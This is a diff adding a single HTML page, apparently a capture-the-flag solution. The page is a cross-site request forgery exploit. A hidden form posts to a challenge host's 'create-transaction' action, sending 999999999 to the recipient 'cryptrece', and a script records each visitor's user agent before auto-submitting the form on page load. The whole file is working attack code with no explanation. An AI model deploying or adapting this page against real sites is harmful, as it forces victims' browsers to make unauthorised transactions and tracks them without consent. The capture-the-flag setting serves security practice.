@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CTF Challenge Solution</title>
+</head>
+<body>
+<form id="tx" action="https://hackchan-mjk2mpay.ctf.pro/?action=create-transaction" method="POST">
+  <input name="recipient" value="cryptrece" />
+  <input name="amount"    value="999999999" />
+</form>
+<script>
+  // Log visit to our API endpoint
+  fetch('/api/log-visit', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent
+    })
+  });
+  
+  // Submit the form
+  document.getElementById('tx').submit();
+</script>
+</body>
+</html>
